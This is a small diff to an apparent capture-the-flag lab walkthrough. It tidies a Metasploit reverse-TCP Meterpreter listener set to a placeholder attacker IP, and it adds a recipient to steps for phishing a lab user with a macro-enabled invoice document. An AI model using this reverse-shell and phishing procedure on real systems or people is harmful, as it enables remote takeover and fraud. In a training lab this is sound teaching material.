@@ -356,7 +356,7 @@ msfconsole
 use multi/handler
 set payload windows/meterpreter/reverse_tcp
 set LHOST <ATTACKBOX_IP>
-set LPORT 8888 specifies
+set LPORT 8888
 exploit
 ```
 
@@ -377,6 +377,7 @@ mv /root/.msf4/local/msf.docm /root/invoice.docm
 * Go to http://MAILSERVER_IP
 * Login as **info@socnas.thm**, password **MerryPhishMas!**
 * New email:
+  * To: marta@socmas.thm
   * Subject: Invoice
   * Body: Please find attached invoice, best regards! (bla bla bla)
   * Attach /root/invoice.docm
